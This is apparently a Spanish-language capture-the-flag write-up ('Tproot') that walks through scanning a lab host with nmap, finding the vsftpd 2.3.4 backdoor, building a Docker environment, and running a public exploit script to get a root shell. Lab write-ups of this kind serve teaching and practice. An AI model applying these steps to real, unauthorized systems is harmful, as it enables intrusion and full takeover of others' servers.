# Tproot

## 1. Reconocimiento Inicial de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `21/tcp open ftp vsftpd 2.3.4`: El puerto 21 está abierto y ejecuta el servidor FTP vsftpd versión 2.3.4.
*   `80/tcp open http Apache httpd 2.4.58`: El puerto 80 está abierto y ejecuta un servidor web Apache.

### 1.2. Enumeración Web (Sin Resultados)

Al acceder a la página web en el puerto 80, encontramos la página por defecto de Apache, lo que indica que no hay información útil directamente en el sitio web. Intentar `gobuster` para enumerar directorios tampoco arroja resultados, confirmando que el punto de entrada no es la web.

## 2. Explotación del Servicio FTP

La versión `vsftpd 2.3.4` es famosa por tener una puerta trasera (backdoor) que permite la ejecución remota de comandos. Esta vulnerabilidad se introdujo maliciosamente en el código fuente de esta versión específica.

### 2.1. Búsqueda de Exploits con Searchsploit

Utilizamos `searchsploit` para buscar exploits públicos relacionados con `vsftpd 2.3.4`. Esto nos confirma la existencia de exploits para la ejecución de comandos.

```bash
searchsploit vsftpd 2.3.4
```

**Resultados Relevantes:**

*   `vsftpd 2.3.4 - Backdoor Command Execution`
*   `vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)`

Estos resultados indican que podemos obtener una shell remota.

### 2.2. Explotación Manual (Consideraciones)

Aunque existen exploits en Python, a veces pueden surgir problemas de dependencias o entornos (`externally-managed-environment` en `pip`). Para asegurar un entorno controlado y evitar estos problemas, una buena práctica es ejecutar el exploit dentro de un contenedor Docker.

**Pasos para el Entorno Docker (Opcional, para evitar problemas de dependencias):**

1.  **Crear un `Dockerfile`:** Define un entorno con Python, herramientas necesarias y las dependencias específicas del exploit (como `paramiko==2.4.2`).

    ```dockerfile
    # Imagen base con Python 3
    FROM python:3.8-slim

    # Evitamos preguntas interactivas en la instalación de paquetes
    ENV DEBIAN_FRONTEND=noninteractive

    # Actualizamos e instalamos dependencias útiles
    RUN apt-get update && apt-get install -y \
        apt-utils \
        git \
        nano \
        curl \
        wget \
        iputils-ping \
        net-tools \
        inetutils-ping \
        openssh-client \
        procps \
        vim \
        && rm -rf /var/lib/apt/lists/*

    # Creamos carpeta de trabajo
    WORKDIR /exploit

    # Copiamos todos los archivos locales al contenedor
    COPY . /exploit

    # Instalamos versión antigua de Paramiko (necesaria para algunos exploits antiguos)
    RUN pip install paramiko==2.4.2

    # Al arrancar, dejamos un shell interactivo
    ENTRYPOINT ["/bin/bash"]
    ```

2.  **Construir la imagen:** Compila el `Dockerfile` para crear una imagen Docker.

    ```bash
sudo docker build -t miimagen .
    ```

3.  **Ejecutar el contenedor:** Inicia el contenedor, montando un volumen para acceder a wordlists si es necesario.

    ```bash
sudo docker run -it --rm \
  -v /usr/share/wordlists:/wordlists \
  miimagen
    ```

### 2.3. Ejecución del Exploit

Una vez en un entorno adecuado (ya sea local o en el contenedor Docker), instalamos `pwntools` (necesaria para este exploit) y ejecutamos el script.

```bash
pip install pwntools
python3 exploit.py <IP_DEL_OBJETIVO>
```

Este exploit se conecta al servidor FTP, envía un comando específico que activa la puerta trasera y nos proporciona una shell remota con privilegios de `root`.

### 2.4. Verificación de Acceso

Una vez que obtenemos la shell, el comando `whoami` confirmará que hemos iniciado sesión como `root`.

```bash
whoami
# root
```
